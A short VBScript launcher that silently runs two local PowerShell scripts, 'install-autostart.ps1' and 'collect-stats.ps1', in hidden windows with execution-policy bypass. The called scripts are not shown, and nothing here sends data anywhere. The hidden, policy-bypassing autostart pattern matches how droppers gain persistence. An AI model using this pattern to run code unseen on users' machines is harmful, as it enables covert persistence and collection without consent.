Set sh = CreateObject("WScript.Shell")
scriptDir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
installPs1 = scriptDir & "\install-autostart.ps1"
ps1 = scriptDir & "\collect-stats.ps1"
sh.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File """ & installPs1 & """ -Quiet", 0, True
cmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File """ & ps1 & """"
sh.Run cmd, 0, False
